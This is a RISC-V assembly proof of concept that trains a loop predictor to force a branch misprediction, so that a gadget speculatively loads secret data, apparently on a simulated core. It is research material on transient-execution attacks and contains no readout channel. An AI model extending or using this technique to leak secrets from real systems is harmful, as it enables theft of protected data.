
#define SET_TO_WEAKLY_NOT_TAKEN 0
#define MISPREDICT 2

#define N_DUMMY_RUNS 4
#define LOOP_CONFIDENCE_THRESHOLD 7

.text
init:
    # Wait until all predictors are initialized.
    # The BIM takes 2048 cycles to initialize all entries to weakly taken (2).
    li t1, 64
    init_loop:
        fence
        addi t0, t0, 1
    ble t0, t1, init_loop

    # Training phase: call the victim once.
    # This will:
    # 1. set the BIM entry of the controlled branch to a known state (weakly not taken)
    # 2. as a side effect, this also executes the uncontrolled branch once,
    #    making sure we are not in a cold predictor scenario.
    # li a0, SET_TO_WEAKLY_NOT_TAKEN
    # call victim
    # fence

attacker:
    lla s0, secret_data
    li a0, MISPREDICT

    # Force the victim to mispredict, so that the LoopPredictor gets trigged.

    # In this PoC for some reason (maybe race condition with the BIM update?)
    # the LoopPredictor's confidence is reset after the first 4 mispredictions,
    # so we need 4 pre-training calls.
    .rep N_DUMMY_RUNS
    call victim
    .endr

    # Now we increase the LoopPredictor's confidence until it takes over.
    .rep LOOP_CONFIDENCE_THRESHOLD
    call victim
    .endr

    # Once the LoopPredictor is in charge, it will flip the prediction for
    # our victim branch.
    call victim

    # End simulation.
    unimp

# padding:
.rep 32
nop
.endr

.align 4
victim:
    # Attacker controls the number of iterations.
    mv t2, a0
    li t3, 0  # induction variable

    loop:
      # Make sure there's only one version of the loop in the RoB.
      fence
      # These values are _not_ attacker-controlled.
      li t0, 2
      li t1, 1

      # i++
      addi t3, t3, 1

      # Slow down branch (just multiply t0 by 1).
      .rep 8
      mul t0, t0, t1
      .endr

      # This branch is _never_ taken architecturally (t0 constant > 0).
      # Note that the attacker has no control over t0 (the branch condition).
      .align 4
      uncontrolled_branch:
      beqz t0, speculative_gadget

    # This instruction has to be mispredicted 7 consecutive times, so that the
    # loop predictor can kick in.
    controlled_branch:
    blt t3, t2, loop

# padding:
.rep 32
nop
.endr

ret

# padding:
.rep 64
unimp
.endr

# ----------- Speculative gadget.
.align 4
speculative_gadget:
ld t4, 0(s0)    # < ----- this gets executed speculatively, leaking the secret
addi t4, t4, 10 # Just use the secret
ret

helper:
ret

# padding:
.rep 128
unimp
.endr

# ------------- Data.
# .data
secret_data:
.dword 0xcacacafedeadbeef

# padding:
.dword 0

legit_data:
.dword 0xcacacafedeadbeef
